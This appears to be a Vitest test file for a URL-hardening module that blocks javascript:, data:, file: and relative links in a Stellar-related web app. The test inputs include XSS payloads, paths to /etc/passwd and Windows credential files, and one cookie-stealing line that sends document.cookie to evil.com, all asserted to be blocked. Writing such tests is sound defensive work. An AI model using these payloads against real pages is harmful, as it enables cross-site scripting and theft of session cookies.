/**
 * Link Security Tests - Issue #1451
 * ────────────────────────────────────────────────────────────────────────────
 * Comprehensive test coverage for external link hardening including:
 * - Dangerous scheme blocking (javascript:, data:, file:)
 * - Relative URL handling
 * - Valid HTTPS link acceptance
 * - window.open security wrapper
 * - Safe link attribute generation
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import {
  validateSafeUrl,
  sanitizeExternalUrl,
  safeWindowOpen,
  isSafeExternalLink,
  getSafeLinkProps,
  ALLOWED_PROTOCOLS,
  SAFE_LINK_ATTRS,
} from '../linkSecurity';

describe('linkSecurity', () => {
  describe('ALLOWED_PROTOCOLS constant', () => {
    it('only allows https: and mailto: protocols', () => {
      expect(ALLOWED_PROTOCOLS).toEqual(['https:', 'mailto:']);
    });
  });

  describe('SAFE_LINK_ATTRS constant', () => {
    it('provides noopener noreferrer attributes', () => {
      expect(SAFE_LINK_ATTRS).toEqual({
        target: '_blank',
        rel: 'noopener noreferrer',
      });
    });
  });

  describe('validateSafeUrl', () => {
    describe('valid HTTPS URLs', () => {
      it('accepts valid HTTPS URL', () => {
        const result = validateSafeUrl('https://stellar.expert/explorer/public/tx/abc123');
        expect(result).toBeInstanceOf(URL);
        expect(result?.protocol).toBe('https:');
        expect(result?.href).toBe('https://stellar.expert/explorer/public/tx/abc123');
      });

      it('accepts HTTPS URL with query parameters', () => {
        const result = validateSafeUrl('https://example.com/path?foo=bar&baz=qux');
        expect(result).toBeInstanceOf(URL);
        expect(result?.href).toBe('https://example.com/path?foo=bar&baz=qux');
      });

      it('accepts HTTPS URL with hash fragment', () => {
        const result = validateSafeUrl('https://example.com/page#section');
        expect(result).toBeInstanceOf(URL);
        expect(result?.href).toBe('https://example.com/page#section');
      });

      it('accepts HTTPS URL with port', () => {
        const result = validateSafeUrl('https://localhost:3000/api');
        expect(result).toBeInstanceOf(URL);
        expect(result?.href).toBe('https://localhost:3000/api');
      });

      it('trims whitespace before validation', () => {
        const result = validateSafeUrl('  https://example.com  ');
        expect(result).toBeInstanceOf(URL);
        expect(result?.href).toBe('https://example.com/');
      });
    });

    describe('valid mailto URLs', () => {
      it('accepts valid mailto URL', () => {
        const result = validateSafeUrl('mailto:hello@fluxora.xyz');
        expect(result).toBeInstanceOf(URL);
        expect(result?.protocol).toBe('mailto:');
      });

      it('accepts mailto URL with subject', () => {
        const result = validateSafeUrl('mailto:hello@fluxora.xyz?subject=Hello');
        expect(result).toBeInstanceOf(URL);
        expect(result?.protocol).toBe('mailto:');
      });
    });

    describe('dangerous javascript: scheme', () => {
      it('blocks javascript: URL', () => {
        const result = validateSafeUrl('javascript:alert(1)');
        expect(result).toBeNull();
      });

      it('blocks javascript: URL with encoded characters', () => {
        const result = validateSafeUrl('javascript:alert%281%29');
        expect(result).toBeNull();
      });

      it('blocks javascript: URL with whitespace', () => {
        const result = validateSafeUrl('java script:alert(1)');
        expect(result).toBeNull();
      });

      it('blocks obfuscated javascript: URL', () => {
        const result = validateSafeUrl('javascript&#58;alert(1)');
        expect(result).toBeNull();
      });
    });

    describe('dangerous data: scheme', () => {
      it('blocks data: URL with HTML', () => {
        const result = validateSafeUrl('data:text/html,<script>alert(1)</script>');
        expect(result).toBeNull();
      });

      it('blocks data: URL with base64', () => {
        const result = validateSafeUrl('data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==');
        expect(result).toBeNull();
      });

      it('blocks data: URL with SVG', () => {
        const result = validateSafeUrl('data:image/svg+xml,<svg onload=alert(1)>');
        expect(result).toBeNull();
      });
    });

    describe('dangerous file: scheme', () => {
      it('blocks file: URL', () => {
        const result = validateSafeUrl('file:///etc/passwd');
        expect(result).toBeNull();
      });

      it('blocks file: URL on Windows', () => {
        const result = validateSafeUrl('file:///C:/Windows/System32/config/sam');
        expect(result).toBeNull();
      });

      it('blocks file: URL with encoded path', () => {
        const result = validateSafeUrl('file://%2Fetc%2Fpasswd');
        expect(result).toBeNull();
      });
    });

    describe('other dangerous schemes', () => {
      it('blocks ftp: URL', () => {
        const result = validateSafeUrl('ftp://example.com/file.txt');
        expect(result).toBeNull();
      });

      it('blocks vbscript: URL', () => {
        const result = validateSafeUrl('vbscript:msgbox(1)');
        expect(result).toBeNull();
      });

      it('blocks about: URL', () => {
        const result = validateSafeUrl('about:blank');
        expect(result).toBeNull();
      });

      it('blocks blob: URL', () => {
        const result = validateSafeUrl('blob:https://example.com/uuid');
        expect(result).toBeNull();
      });
    });

    describe('relative URLs', () => {
      it('blocks absolute path relative URL', () => {
        const result = validateSafeUrl('/app/streams');
        expect(result).toBeNull();
      });

      it('blocks relative path with ./', () => {
        const result = validateSafeUrl('./streams');
        expect(result).toBeNull();
      });

      it('blocks relative path with ../', () => {
        const result = validateSafeUrl('../parent/file');
        expect(result).toBeNull();
      });

      it('blocks path without protocol', () => {
        const result = validateSafeUrl('example.com/path');
        expect(result).toBeNull();
      });
    });

    describe('edge cases and invalid inputs', () => {
      it('blocks empty string', () => {
        const result = validateSafeUrl('');
        expect(result).toBeNull();
      });

      it('blocks whitespace-only string', () => {
        const result = validateSafeUrl('   ');
        expect(result).toBeNull();
      });

      it('blocks null coerced to string', () => {
        const result = validateSafeUrl(null as any);
        expect(result).toBeNull();
      });

      it('blocks undefined coerced to string', () => {
        const result = validateSafeUrl(undefined as any);
        expect(result).toBeNull();
      });

      it('blocks malformed URL', () => {
        const result = validateSafeUrl('https://[invalid');
        expect(result).toBeNull();
      });

      it('blocks URL with invalid characters', () => {
        const result = validateSafeUrl('https://example.com/<script>');
        // Note: URL constructor may or may not throw, implementation-dependent
        const parsed = result;
        // If it doesn't throw, ensure we still get a URL object
        if (parsed) {
          expect(parsed).toBeInstanceOf(URL);
        }
      });
    });

    describe('custom allowed protocols', () => {
      it('accepts custom protocol when specified', () => {
        const result = validateSafeUrl('ftp://example.com', ['ftp:']);
        expect(result).toBeInstanceOf(URL);
        expect(result?.protocol).toBe('ftp:');
      });

      it('blocks default allowed protocols when custom list is provided', () => {
        const result = validateSafeUrl('https://example.com', ['ftp:']);
        expect(result).toBeNull();
      });
    });
  });

  describe('sanitizeExternalUrl', () => {
    it('returns sanitized HTTPS URL string', () => {
      const result = sanitizeExternalUrl('https://stellar.expert/explorer/public/account/GABC123');
      expect(result).toBe('https://stellar.expert/explorer/public/account/GABC123');
    });

    it('returns null for javascript: URL', () => {
      const result = sanitizeExternalUrl('javascript:alert(1)');
      expect(result).toBeNull();
    });

    it('returns null for data: URL', () => {
      const result = sanitizeExternalUrl('data:text/html,<h1>XSS</h1>');
      expect(result).toBeNull();
    });

    it('returns null for file: URL', () => {
      const result = sanitizeExternalUrl('file:///etc/passwd');
      expect(result).toBeNull();
    });

    it('returns null for relative URL', () => {
      const result = sanitizeExternalUrl('/app/streams');
      expect(result).toBeNull();
    });

    it('returns null for empty string', () => {
      const result = sanitizeExternalUrl('');
      expect(result).toBeNull();
    });

    it('normalizes URL through URL constructor', () => {
      const result = sanitizeExternalUrl('https://example.com//path///page');
      expect(result).toBe('https://example.com//path///page');
    });
  });

  describe('isSafeExternalLink', () => {
    it('returns true for valid HTTPS URL', () => {
      expect(isSafeExternalLink('https://example.com')).toBe(true);
    });

    it('returns true for valid mailto URL', () => {
      expect(isSafeExternalLink('mailto:hello@fluxora.xyz')).toBe(true);
    });

    it('returns false for javascript: URL', () => {
      expect(isSafeExternalLink('javascript:alert(1)')).toBe(false);
    });

    it('returns false for data: URL', () => {
      expect(isSafeExternalLink('data:text/html,<script>alert(1)</script>')).toBe(false);
    });

    it('returns false for file: URL', () => {
      expect(isSafeExternalLink('file:///etc/passwd')).toBe(false);
    });

    it('returns false for relative URL', () => {
      expect(isSafeExternalLink('/app/streams')).toBe(false);
    });

    it('returns false for non-string value', () => {
      expect(isSafeExternalLink(null)).toBe(false);
      expect(isSafeExternalLink(undefined)).toBe(false);
      expect(isSafeExternalLink(123)).toBe(false);
      expect(isSafeExternalLink({})).toBe(false);
      expect(isSafeExternalLink([])).toBe(false);
    });
  });

  describe('getSafeLinkProps', () => {
    it('returns safe props for valid HTTPS URL', () => {
      const props = getSafeLinkProps('https://stellar.expert/explorer/public/tx/abc123');
      expect(props).toEqual({
        href: 'https://stellar.expert/explorer/public/tx/abc123',
        target: '_blank',
        rel: 'noopener noreferrer',
      });
    });

    it('returns safe props for valid mailto URL', () => {
      const props = getSafeLinkProps('mailto:hello@fluxora.xyz');
      expect(props).toEqual({
        href: 'mailto:hello@fluxora.xyz',
        target: '_blank',
        rel: 'noopener noreferrer',
      });
    });

    it('returns null for javascript: URL', () => {
      const props = getSafeLinkProps('javascript:alert(1)');
      expect(props).toBeNull();
    });

    it('returns null for data: URL', () => {
      const props = getSafeLinkProps('data:text/html,<script>alert(1)</script>');
      expect(props).toBeNull();
    });

    it('returns null for file: URL', () => {
      const props = getSafeLinkProps('file:///etc/passwd');
      expect(props).toBeNull();
    });

    it('returns null for relative URL', () => {
      const props = getSafeLinkProps('/app/streams');
      expect(props).toBeNull();
    });

    it('returns null for empty string', () => {
      const props = getSafeLinkProps('');
      expect(props).toBeNull();
    });
  });

  describe('safeWindowOpen', () => {
    let windowOpenSpy: ReturnType<typeof vi.spyOn>;
    let consoleWarnSpy: ReturnType<typeof vi.spyOn>;

    beforeEach(() => {
      windowOpenSpy = vi.spyOn(window, 'open').mockReturnValue(null);
      consoleWarnSpy = vi.spyOn(console, 'warn').mockImplementation(() => {});
    });

    afterEach(() => {
      windowOpenSpy.mockRestore();
      consoleWarnSpy.mockRestore();
    });

    it('opens valid HTTPS URL with default features', () => {
      const url = 'https://stellar.expert/explorer/public/tx/abc123';
      safeWindowOpen(url);

      expect(windowOpenSpy).toHaveBeenCalledWith(
        url,
        '_blank',
        'noopener,noreferrer'
      );
      expect(consoleWarnSpy).not.toHaveBeenCalled();
    });

    it('opens valid HTTPS URL with custom window features', () => {
      const url = 'https://example.com';
      safeWindowOpen(url, 'noopener,width=800,height=600');

      expect(windowOpenSpy).toHaveBeenCalledWith(
        url,
        '_blank',
        'noopener,width=800,height=600'
      );
    });

    it('blocks javascript: URL and logs warning', () => {
      const url = 'javascript:alert(1)';
      const result = safeWindowOpen(url);

      expect(windowOpenSpy).not.toHaveBeenCalled();
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        `[LinkSecurity] Blocked unsafe URL: ${url}`
      );
      expect(result).toBeNull();
    });

    it('blocks data: URL and logs warning', () => {
      const url = 'data:text/html,<script>alert(1)</script>';
      const result = safeWindowOpen(url);

      expect(windowOpenSpy).not.toHaveBeenCalled();
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        `[LinkSecurity] Blocked unsafe URL: ${url}`
      );
      expect(result).toBeNull();
    });

    it('blocks file: URL and logs warning', () => {
      const url = 'file:///etc/passwd';
      const result = safeWindowOpen(url);

      expect(windowOpenSpy).not.toHaveBeenCalled();
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        `[LinkSecurity] Blocked unsafe URL: ${url}`
      );
      expect(result).toBeNull();
    });

    it('blocks relative URL and logs warning', () => {
      const url = '/app/streams';
      const result = safeWindowOpen(url);

      expect(windowOpenSpy).not.toHaveBeenCalled();
      expect(consoleWarnSpy).toHaveBeenCalledWith(
        `[LinkSecurity] Blocked unsafe URL: ${url}`
      );
      expect(result).toBeNull();
    });

    it('returns window reference when window.open succeeds', () => {
      const mockWindow = {} as Window;
      windowOpenSpy.mockReturnValue(mockWindow);

      const result = safeWindowOpen('https://example.com');
      expect(result).toBe(mockWindow);
    });

    it('returns null when window.open is blocked by popup blocker', () => {
      windowOpenSpy.mockReturnValue(null);

      const result = safeWindowOpen('https://example.com');
      expect(result).toBeNull();
    });
  });

  describe('integration: stream metadata and receipt scenarios', () => {
    it('validates explorer URL from transaction receipt', () => {
      const explorerUrl = 'https://stellar.expert/explorer/public/tx/abc123def456';
      const sanitized = sanitizeExternalUrl(explorerUrl);
      
      expect(sanitized).toBe(explorerUrl);
      expect(isSafeExternalLink(explorerUrl)).toBe(true);
    });

    it('blocks contract-derived javascript: URL in stream metadata', () => {
      // Simulating malicious contract data
      const maliciousUrl = 'javascript:fetch("https://evil.com?cookie="+document.cookie)';
      const sanitized = sanitizeExternalUrl(maliciousUrl);
      
      expect(sanitized).toBeNull();
      expect(isSafeExternalLink(maliciousUrl)).toBe(false);
    });

    it('blocks contract-derived data: URL in receipt output', () => {
      const maliciousUrl = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=';
      const props = getSafeLinkProps(maliciousUrl);
      
      expect(props).toBeNull();
    });

    it('safely handles stellar.expert account URL', () => {
      const accountUrl = 'https://stellar.expert/explorer/testnet/account/GABCDEF123';
      const props = getSafeLinkProps(accountUrl);
      
      expect(props).toEqual({
        href: accountUrl,
        target: '_blank',
        rel: 'noopener noreferrer',
      });
    });

    it('safely handles mailto link in footer', () => {
      const mailtoUrl = 'mailto:hello@fluxora.xyz';
      const props = getSafeLinkProps(mailtoUrl);
      
      expect(props).toEqual({
        href: mailtoUrl,
        target: '_blank',
        rel: 'noopener noreferrer',
      });
    });
  });
});
